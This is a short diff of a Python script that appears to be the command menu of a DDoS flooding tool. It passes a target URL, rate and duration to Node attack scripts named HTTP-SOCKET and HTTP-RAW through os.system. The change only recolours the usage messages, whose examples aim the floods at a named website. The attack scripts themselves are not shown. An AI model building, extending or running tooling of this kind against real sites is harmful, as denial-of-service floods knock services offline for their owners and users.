@@ -90,8 +90,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
-                print(Fore.RED +'Example: http-socket http://LeMinhTu.info/ 5000 60')
+                print(Fore.LIGHTCYAN_EX +'Usage: http-socket <url> <per> <time>')
+                print(Fore.LIGHTCYAN_EX +'Example: http-socket http://LeMinhTu.info/ 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -99,8 +99,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-raw <url> <time>')
-                print(Fore.RED +'Example: http-raw http://LeMinhTu.info/ 60')
+                print(Fore.LIGHTCYAN_EX +'Usage: http-raw <url> <time>')
+                print(Fore.LIGHTCYAN_EX +'Example: http-raw http://LeMinhTu.info/ 60')
 
         elif "http-requests" in cnc:
             try:
